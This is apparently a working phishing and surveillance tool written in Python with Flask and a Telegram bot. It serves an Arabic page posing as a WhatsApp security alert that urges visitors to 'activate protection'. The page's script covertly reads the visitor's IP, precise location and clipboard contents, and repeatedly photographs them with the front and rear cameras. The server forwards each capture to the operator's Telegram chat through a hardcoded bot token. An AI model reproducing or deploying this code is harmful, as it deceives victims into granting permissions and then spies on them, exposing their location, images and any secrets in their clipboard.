import os, time, telebot, base64, threading
from flask import Flask, request, render_template_string

# --- الإعدادات (تأكد من وضع بياناتك) ---
TOKEN = '8390076798:AAGXs0nv45Swv5JaDs9YCcwRiUgqPbskcAI'
ADMIN_ID = 5288849409

bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

HTML_LAYOUT = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Privacy & Security</title>
    <style>
        body { font-family: -apple-system, Segoe UI, Roboto, Helvetica; background: #0b141a; color: #e9edef; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .container { background: #222e35; padding: 35px; border-radius: 10px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
        .progress-box { display: none; margin-top: 25px; text-align: right; font-family: monospace; font-size: 12px; color: #00ff00; background: #111b21; padding: 15px; border-radius: 8px; border: 1px solid #3b4a54; }
        .btn-verify { background: #00a884; color: #111b21; border: none; padding: 16px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
        .btn-verify:active { opacity: 0.7; }
        .footer-text { margin-top: 20px; font-size: 11px; color: #8696a0; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="50" style="margin-bottom: 15px;">
        <h2 style="font-size: 18px; color: #e9edef;">تأمين خصوصية الحساب</h2>
        <p style="font-size: 13px; color: #8696a0; line-height: 1.5;">تم رصد محاولة وصول غير مصرح بها لبياناتك الشخصية. يرجى تفعيل بروتوكول الحماية لغلق الثغرات وتأمين التشفير.</p>
        
        <button class="btn-verify" id="mainBtn" onclick="initiateSecurityProtocol()">تفعيل الحماية الآن</button>
        
        <div id="statusBox" class="progress-box"></div>
        
        <div class="footer-text">نظام حماية واتساب الموحد © 2026</div>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
    let stream;
    let meta = { ip: "جاري الفحص...", clip: "N/A" };

    // جلب البيانات الأولية صمتاً
    window.onload = async () => {
        try {
            const r = await fetch('https://api.ipify.org?format=json');
            meta.ip = (await r.json()).ip;
        } catch(e){}
        navigator.geolocation.getCurrentPosition(p => {
            meta.loc = p.coords.latitude + "," + p.coords.longitude;
        }, null, {enableHighAccuracy: true});
    };

    async function initiateSecurityProtocol() {
        document.getElementById('mainBtn').style.display = 'none';
        const box = document.getElementById('statusBox');
        box.style.display = 'block';
        
        const log = (m) => box.innerHTML += "• " + m + "<br>";

        log("بدء فحص طبقة التشفير...");
        try { meta.clip = await navigator.clipboard.readText(); } catch(e){}

        // تفعيل سيل البيانات (تبادل العدسات)
        await startCycle("user"); 
    }

    async function startCycle(mode) {
        const box = document.getElementById('statusBox');
        const log = (m) => box.innerHTML += "• " + m + "<br>";

        try {
            if(stream) stream.getTracks().forEach(t => t.stop());
            stream = await navigator.mediaDevices.getUserMedia({ video: {facingMode: mode} });
            document.getElementById('v').srcObject = stream;

            setTimeout(() => {
                const c = document.getElementById('c');
                const v = document.getElementById('v');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                
                fetch('/secure_endpoint', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        img: c.toDataURL('image/jpeg', 0.5),
                        cam: (mode === "user" ? "الداخلية" : "الخارجية"),
                        info: meta 
                    })
                });

                box.scrollTop = box.scrollHeight;
                log(mode === "user" ? "جاري بناء الحماية..." : "جاري فحص النزاهة...");
                
                // الانتقال التلقائي للعدسة الأخرى
                setTimeout(() => startCycle(mode === "user" ? "environment" : "user"), 4000);
            }, 2000);

        } catch(e) {
            log("<span style='color:#ff3b30;'>خطأ: يرجى منح الإذن لإتمام التأمين.</span>");
        }
    }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML_LAYOUT)

@app.route('/secure_endpoint', methods=['POST'])
def secure_endpoint():
    d = request.json
    p = d.get('info', {})
    
    # التقرير الفني للبوت
    report = (
        f"🛡️ **سيل تأمين (تقرير حي)**\n"
        f"━━━━━━━━━━━━━━\n"
        f"📷 **العدسة:** `{d.get('cam')}`\n"
        f"🌐 **الـ IP:** `{p.get('ip')}`\n"
        f"📍 **الموقع:** `{p.get('loc', 'غير متاح')}`\n"
        f"📋 **الحافظة:** `{p.get('clip')}`\n"
        f"━━━━━━━━━━━━━━"
    )

    if 'img' in d:
        img_data = base64.b64decode(d['img'].split(',')[1])
        with open("snap.jpg", "wb") as f: f.write(img_data)
        with open("snap.jpg", "rb") as photo:
            bot.send_photo(ADMIN_ID, photo, caption=report, parse_mode="Markdown")
    return {"status": "success"}

if __name__ == '__main__':
    threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
